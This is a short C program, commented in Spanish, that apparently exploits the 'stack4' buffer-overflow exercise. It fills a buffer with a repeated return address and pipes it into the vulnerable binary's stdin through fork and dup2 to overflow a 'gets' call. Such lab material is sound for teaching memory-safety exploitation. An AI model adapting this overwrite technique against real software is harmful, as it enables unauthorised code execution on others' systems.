#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>

main()
{

	char buf[1024];
	int pipes[2];
	pid_t pidchild;
	int i;	

	for(i=0;i<200;i+=4) {
      	   buf[i+3]='\x00';
	   buf[i+2]='\x40';
           buf[i+1]='\x0c';
           buf[i]='\x40';
	}
	buf[i]='\n'; //Para que "gets" tome la cadena

	pipe(pipes);
	fprintf(stderr,"Buscando vulnerabilidades\n");
	if( !(pidchild=fork()) ){ //devuelve el PID del proc hijo

		//cerramos la salida de la pipe, porque de aquí sólo queremos leer
		close(pipes[1]);
		//todo lo que entre en pipe, lo queremos poner al stdin (0)
		dup2(pipes[0],0);
		//cerramos el pipe de entrada, porque ya lo hemos copiado
		close(pipes[0]);

		execl("./stack4",NULL);
	}

	//cerramos la entrada de la pipe, porque de aqui solo queremos escribir
	close(pipes[0]);
	//todo lo que escribamos en stdout, lo escribiremos en la pipe de escritura
	dup2(pipes[1],1);
	//cerramos la pipe de escritura, ya que ahora se hace referencia a ella por stdout
	close(pipes[1]);

	//escribimos en nuestro stdout, que hace referencia a pipe[1],
	//la cual esta conectada con pipe[0], que corresponde al stdin
	//del proceso hijo
	write(1,buf,sizeof(buf));

	waitpid(pidchild,0,0); //esperamos a que termine el hijo
	exit(0);

}
